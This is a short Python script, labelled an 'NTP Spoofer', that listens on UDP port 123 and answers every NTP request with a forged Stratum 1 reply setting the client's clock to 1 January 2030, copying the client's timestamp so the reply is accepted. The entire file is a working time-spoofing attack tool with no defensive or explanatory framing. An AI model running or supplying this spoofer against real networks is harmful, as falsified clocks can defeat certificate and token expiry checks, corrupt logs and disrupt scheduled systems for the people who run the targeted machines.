import socket
import struct

# Jan 1, 2030 (NTP epoch is 1900)
FUTURE_TIMESTAMP = 4102444800 

def start_spoofer():
    # Create a UDP socket and bind to NTP port 123
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 123))
    
    print("[+] NTP Spoofer (Socket Mode) active. Waiting for requests...")

    while True:
        data, addr = sock.recvfrom(1024)
        print(f"[!] Intercepted NTP request from {addr[0]}")

        # Extract the Transmit Timestamp from the client request (last 8 bytes)
        # We need this to make the response "valid" for the client
        transmit_timestamp = data[40:48]

        # Build an NTP Response (Mode 4, Stratum 1)
        # LI=0, VN=4, Mode=4 -> 0x24 (00 100 100)
        header = struct.pack('!B B B b I I I Q Q Q Q',
            0x24,       # LI, Version, Mode
            1,          # Stratum
            0,          # Poll
            -6,         # Precision
            0, 0, 0,    # Root Delay, Dispersion, Reference ID
            FUTURE_TIMESTAMP << 32, # Reference Timestamp
            struct.unpack('!Q', transmit_timestamp)[0], # Origin Timestamp (from client)
            FUTURE_TIMESTAMP << 32, # Receive Timestamp
            FUTURE_TIMESTAMP << 32  # Transmit Timestamp
        )

        sock.sendto(header, addr)
        print(f"[*] Sent spoofed NTP response (Time: 2030-01-01)")

if __name__ == "__main__":
    start_spoofer()